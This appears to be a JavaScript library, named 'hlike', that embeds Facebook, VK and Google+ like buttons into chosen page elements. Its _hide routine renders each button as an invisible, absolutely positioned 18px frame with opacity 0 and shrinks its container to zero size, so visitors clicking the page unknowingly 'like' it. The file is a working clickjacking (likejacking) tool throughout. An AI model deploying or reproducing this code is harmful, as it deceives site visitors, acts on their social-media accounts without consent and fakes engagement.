var hlike = {
  fbKey: '',
  vkKey: '',
  url: document.location.href,
  style: {},
  defaultStyle: {
    widget: {
      height: '0',
      width: '0'
    },
    widget_iframe: {
      display: 'inline-block',
      position: 'absolute',
      width: '18px',
      height: '18px',
      top: '0px',
      left: '0px',
      overflow: 'hidden',
      opacity: 0,
    }
  },
  set: function(params) {
    for(var key in params) {
      hlike[key] = params[key];
    }
    return hlike;
  },
  
  fb: function(selector) {
      var d = document;
      var elements = d.querySelectorAll(selector);

      hlike._fb.widgets = elements;

      for(var i = hlike._fb.widgets.length-1; i >= 0; i--) {
        var widget = hlike._fb.widgets[i];

        var widgetFrame = d.createElement('div'); 
        
        widget.appendChild(widgetFrame);

        widgetFrame.setAttribute('class', 'hlike-frame fb-like');
        widgetFrame.setAttribute('data-href', hlike.url);
        widgetFrame.setAttribute('data-layout', 'button');
        widgetFrame.setAttribute('data-action', 'like');
        widgetFrame.setAttribute('data-show-faces', 'false');
        widgetFrame.setAttribute('data-share', 'false');
        
        hlike._hide(widget);
      }

      setTimeout(function(){
        hlike._fbInit();
      }, 0);
      
      return hlike;
  },
  
  vk: function(selector) {
      var d = document;
      var elements = d.querySelectorAll(selector);
      hlike._vk.widgets = elements;
      hlike._vkInit(function(){
        VK.init({apiId: hlike.vkKey, onlyWidgets: true});

        for(var i = hlike._vk.widgets.length-1; i >= 0; i--) {
          var widget = hlike._vk.widgets[i];

          var widgetFrame = d.createElement('div'); 
          
          widget.appendChild(widgetFrame);

          widgetFrame.setAttribute('class', 'hlike-frame vk_like');
          widgetFrame.setAttribute('id', 'vk_like_'+i);

          
          VK.Widgets.Like("vk_like_"+i, {type: "mini"});
          setTimeout(function(){
            hlike._hide(widget);
          }, 50);
        }
      });
      
      return hlike;
  },
  
  gp: function(selector) {
    var d = document;
    var elements = d.querySelectorAll(selector);
    hlike._gp.widgets = elements;
    
    for(var i = hlike._gp.widgets.length-1; i >= 0; i--) {
      var widget = hlike._gp.widgets[i];
      var widgetFrame = d.createElement('div'); 
        
      widget.appendChild(widgetFrame);
      
      widgetFrame.setAttribute('class', 'hlike-frame');
      widgetFrame.setAttribute('data-size', 'small');
      
      var widgetFrameInner = d.createElement('div');
      widgetFrame.appendChild(widgetFrameInner);
      widgetFrameInner.setAttribute('class', 'g-plusone');
      widgetFrameInner.setAttribute('id', 'g-plusone-'+i);
    }
    
    hlike._gpInit(function(){
      setTimeout(function() {
        for(var i = hlike._gp.widgets.length-1; i >= 0; i--) {
          var widget = hlike._gp.widgets[i];
          hlike._hide(widget);
        }
      }, 0);
    });
    
    return hlike;
    
  },
  _hide: function(widget) {
    var widget_iframe = widget.querySelector('.hlike-frame');
    for(var key in hlike.style.widget) {
      widget.style[key] = hlike.style.widget[key];
    }
    for(var key in hlike.style.widget_iframe) {
      widget_iframe.style[key] = hlike.style.widget_iframe[key];
    }
  },
  _fs: document.getElementsByTagName('script')[0],
  _fb: {id: 'facebook-jssdk'},
  _vk: {},
  _gp: {},
  _fbInit: function(callback) {
    var d = document;
    if (!d.getElementById(hlike._fb.id)) {
      hlike._fb.js = d.createElement('script'); 
      hlike._fb.js.setAttribute('id', hlike._fb.id);
      hlike._fb.js.onload = callback;
      
      if(!d.getElementById('fb-root')) {
         hlike._fb.root = d.createElement("div"); 
         hlike._fb.root.setAttribute('id', 'fb-root'); 
         d.querySelector('body').appendChild(hlike._fb.root);
      }

      hlike._fs.parentNode.insertBefore(hlike._fb.js, hlike._fs);
      hlike._fb.js.setAttribute('src', '//connect.facebook.net/ru_RU/sdk.js#xfbml=1&version=v2.5&appId='+hlike.fbKey);
    }
  },
  _vkInit: function(callback) {
    var d = document;
    hlike._vk.js = d.createElement('script'); 
    hlike._vk.js.onload = callback;

    hlike._fs.parentNode.insertBefore(hlike._vk.js, hlike._fs);
    hlike._vk.js.setAttribute('src', '//vk.com/js/api/openapi.js?117');
  },
  _gpInit: function(callback) {
    var d = document;
    hlike._gp.js = d.createElement('script'); 
    hlike._gp.js.onload = callback;

    hlike._fs.parentNode.insertBefore(hlike._gp.js, hlike._fs);
    hlike._gp.js.setAttribute('src', 'https://apis.google.com/js/platform.js');
  }
};